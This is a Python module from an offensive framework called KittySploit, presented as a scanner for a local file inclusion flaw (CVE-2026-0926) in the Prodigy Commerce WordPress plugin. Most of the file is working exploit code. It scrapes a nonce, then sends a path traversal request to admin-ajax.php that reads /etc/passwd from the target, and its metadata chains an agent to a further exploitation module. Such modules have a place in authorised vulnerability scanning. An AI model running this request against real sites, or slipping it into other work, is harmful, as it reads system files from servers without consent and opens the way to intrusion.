#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Prodigy Commerce <= 3.3.0 template_name LFI (CVE-2026-0926)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "prodigy-commerce"
_VULN_HIGH = (3, 3, 0)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Prodigy Commerce CVE-2026-0926 LFI detect",
        "description": (
            "Detects CVE-2026-0926 via prodigy-render-my-account-widget and "
            "parameters[template_name]=etc/passwd traversal."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-0926",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-0926"],
        "modules": ["auxiliary/admin/http/prodigy_commerce_cve_2026_0926_lfi"],
        "tags": ["web", "scanner", "wordpress", "prodigy-commerce", "lfi", "cve-2026-0926"],
        "agent": {
            "chain": {"suggested_followups": ["auxiliary/admin/http/prodigy_commerce_cve_2026_0926_lfi"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    _NONCE = re.compile(r'"nonce"\s*:\s*"([a-f0-9]+)"')

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _nonce(self) -> str:
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        if not home:
            return ""
        m = self._NONCE.search(home.text or "")
        return m.group(1) if m else ""

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce = self._nonce()
        if not nonce:
            return False
        data = (
            f"action=prodigy-render-my-account-widget&nonce={nonce}"
            f"&parameters[template_name]=etc/passwd&parameters[default_path]=/"
        )
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=data,
            allow_redirects=False,
        )
        if r and r.status_code == 200 and re.search(r"root:.*:0:0:", r.text or ""):
            self.set_info(
                severity="critical",
                reason="Prodigy Commerce CVE-2026-0926 LFI confirmed",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2026-0926",
            )
            return True
        return False
